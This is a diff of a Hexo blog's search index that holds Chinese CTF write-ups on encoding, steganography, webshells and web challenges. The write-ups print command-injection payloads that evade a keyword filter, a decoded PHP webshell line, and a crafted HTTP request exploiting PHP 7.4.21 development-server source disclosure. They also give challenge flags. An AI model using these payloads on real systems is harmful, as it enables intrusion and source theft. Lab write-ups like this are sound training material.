@@ -20,16 +20,12 @@
     <url>/2024/02/04/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
 <p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
 <h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
 <p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
 <h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
 <p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
@@ -41,7 +37,7 @@
 <p>下载附件得到一串base类型的编码： </p>
 <p><code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code></p>
 <p>尝试之后得到解码路径为：base32 - base58 - base64。</p>
-<p>得到Flag为 <strong>flag{Base_15_S0_Easy_^_^}</strong> ，解题完成。</p>
+<p>得到Flag为 <strong>flag{Base<em>15_S0_Easy\</em>^_^}</strong> ，解题完成。</p>
 <h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>先看题目，得到信息为图片隐写类型。</p>
 <p><img src="https://s2.loli.net/2023/10/31/fDgFKQn7HdN1BV4.png" alt="image.png"></p>
 <p>下载附件后得到一个二维码，直接扫码无Flag信息。通过StegSolve - Data Extract打开，调整为以下设置。即可得到Flag为 <strong>flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</strong> ，解题完成。</p>
@@ -103,7 +99,6 @@
 <p>只好求助于大佬们的WP了，呜呜呜。</p>
 <p>使用这一段PHP脚本来对WebShell脚本进行解密。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;此处省略题目文件中的编码内容&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$shell</span>))&#123;</span><br><span class="line">		<span class="variable">$tmp</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">		<span class="variable">$shell</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$shell</span>;</span><br></pre></td></tr></table></figure>
-
 <p>使用PHPStudy运行后得到：<code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p>
 <p>接下去开始常规操作，使用HackBar工具，对7d67973a变量GET传参，对9fa3变量POST传参。</p>
 <p><img src="https://s2.loli.net/2023/11/06/ZFbq2TmWALncYBX.png" alt="image.png"></p>
@@ -112,7 +107,7 @@
 <p><img src="https://s2.loli.net/2023/11/06/2MfFaDeymwi6ptA.png" alt="image.png"></p>
 <h2 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h2><p>先看题目，提示说多看看题目名。根据题目名Jvav猜测会和Java有关，结合秘密藏在图片中，应该是隐写类型。</p>
 <p>查阅信息后得到 <strong>Java盲水印(BlindWaterMark)</strong> 这一知识点。</p>
-<p><a href="https://github.com/yxiaojian/blindwatermark">GitHub - Yxiaojian&#x2F;BlindWaterMark: Java盲水印</a></p>
+<p><a href="https://github.com/yxiaojian/blindwatermark">GitHub - Yxiaojian/BlindWaterMark: Java盲水印</a></p>
 <p><img src="https://s2.loli.net/2023/11/06/NEhnxqkzMspKLZo.png" alt="image.png"></p>
 <p>在GitHub上搜索可以得到已编译的Java程序，运行即可得到Flag为 <strong>flag{3bb3c3a628a94c}</strong> ，解题完成。</p>
 <p><img src="https://s2.loli.net/2023/11/06/qrePNiy1u7l2dbg.png" alt="image.png"></p>
@@ -141,9 +136,9 @@
 <p><img src="https://s2.loli.net/2023/10/22/Uf4osNJ3lkRj6Wv.png" alt="image.png"></p>
 <p><img src="https://s2.loli.net/2023/10/22/wT5GJmPZtQFIxyX.png" alt="image.png"></p>
 <p>开启环境后，在源码中发现几段命令注入的语句提示。在用户名输入框中测试：</p>
-<p>1&amp;&amp;ls		能够正常显示结果，发现目录下存在flag.php和index.php两个文件。</p>
-<p>1&amp;&amp;cat flag.php		提示非法操作，猜测有关键词过滤。</p>
-<p>1&amp;&amp;ca\t fl\ag.php		正常显示Flag内容为 <strong>NSSCTF{408900e5-67bf-4c99-bd4f-34e75a6e7f22}</strong> ，解题完成。</p>
+<p>1&amp;&amp;ls        能够正常显示结果，发现目录下存在flag.php和index.php两个文件。</p>
+<p>1&amp;&amp;cat flag.php        提示非法操作，猜测有关键词过滤。</p>
+<p>1&amp;&amp;ca\t fl\ag.php        正常显示Flag内容为 <strong>NSSCTF{408900e5-67bf-4c99-bd4f-34e75a6e7f22}</strong> ，解题完成。</p>
 <p>复盘index.php文件内容，1&amp;&amp;ca\t ind\ex.php，可以看出过滤的具体语句。</p>
 <p><img src="https://s2.loli.net/2023/10/22/NY71ngKox3Hdav5.png" alt="image.png"></p>
 <h1 id="WEB-webshell是啥捏"><a href="#WEB-webshell是啥捏" class="headerlink" title="WEB - webshell是啥捏"></a>WEB - webshell是啥捏</h1><p>先看题目，只发现题目有webshell提示，不清楚用途。</p>
@@ -155,13 +150,12 @@
 <p>得到Flag为 <strong>FSCTF{h3llo_ctfe2_5ign_in_webshell_Is_e@sy_right}</strong> ，解题完成。</p>
 <h1 id="WEB-签到plus"><a href="#WEB-签到plus" class="headerlink" title="WEB - 签到plus"></a>WEB - 签到plus</h1><p>先看题目，发现信息”被黑客接管“，根据以往刷题经历判断出目录中存在shell.php文件。</p>
 <p><img src="https://s2.loli.net/2023/10/22/nKBp29hDMmZQ6ge.png" alt="image.png"></p>
-<p>开启环境后，在URL中加入&#x2F;shell.php，观察网页信息，能够发现一个前缀为NSSCTF的Flag内容，但并不正确。</p>
+<p>开启环境后，在URL中加入/shell.php，观察网页信息，能够发现一个前缀为NSSCTF的Flag内容，但并不正确。</p>
 <p>继续寻找，得到PHP版本为7.4.21。通过搜索得知此版本存在一个漏洞：Remote Source Disclosure。</p>
-<p>关于此漏洞的分析：<a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">PHP Development Server &lt;&#x3D; 7.4.21 - Remote Source Disclosure (projectdiscovery.io)</a></p>
+<p>关于此漏洞的分析：<a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">PHP Development Server &lt;= 7.4.21 - Remote Source Disclosure (projectdiscovery.io)</a></p>
 <p>开始复现漏洞，BurpSuite抓包后丢到重放器并且关闭重放器的自动修改Content-Length选项。</p>
 <p>修改请求头为（需包含所有换行符）：</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/phpinfo.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>pd.research</span><br><span class="line"></span><br><span class="line"><span class="language-http"></span></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure>
-
 <p>开始放包。即可得到一串php代码，并且其格式与上一题完全相同。</p>
 <p><img src="https://s2.loli.net/2023/10/23/eXL6RMxnic3APmd.png" alt="image.png"></p>
 <p>代码中的<code>if (isset($_GET[&#39;&#39;]))</code>表示判断方括内的变量是否存在，因此解题关键在于传参传入一个同名的变量来实现命令注入。</p>
@@ -221,7 +215,7 @@
 <p><img src="https://s2.loli.net/2023/10/22/FPDmMv9sYr6IBi8.png" alt="image.png"></p>
 <p>附件为一个Word文档，猜测有隐写存在。</p>
 <p><img src="https://s2.loli.net/2023/10/22/fbrJj3C6mypEkdN.png" alt="image.png"></p>
-<p>这里选择将docx后缀改为zip格式打开，在目录word下打开document.xml，找到两段Flag内容，FSCTF{N0t_A_heRo_和doEs_not_re@d_t。在群里hint中得到第三段Flag为He_3_Kinggggdoms。</p>
+<p>这里选择将docx后缀改为zip格式打开，在目录word下打开document.xml，找到两段Flag内容，FSCTF{N0t<em>A_heRo</em>和doEs_not_re@d_t。在群里hint中得到第三段Flag为He_3_Kinggggdoms。</p>
 <p>拼接后得到Flag为 <strong>FSCTF{N0t_A_heRo_doEs_not_re@d_tHe_3_Kinggggdoms}</strong> ，解题完成。</p>
 <h1 id="MISC-ez-osint"><a href="#MISC-ez-osint" class="headerlink" title="MISC - ez-osint"></a>MISC - ez-osint</h1><p>先看题目，根据图片解出拍摄时间。</p>
 <p><img src="https://s2.loli.net/2023/10/22/AotmwW9OCu7MH3S.png" alt="image.png"></p>
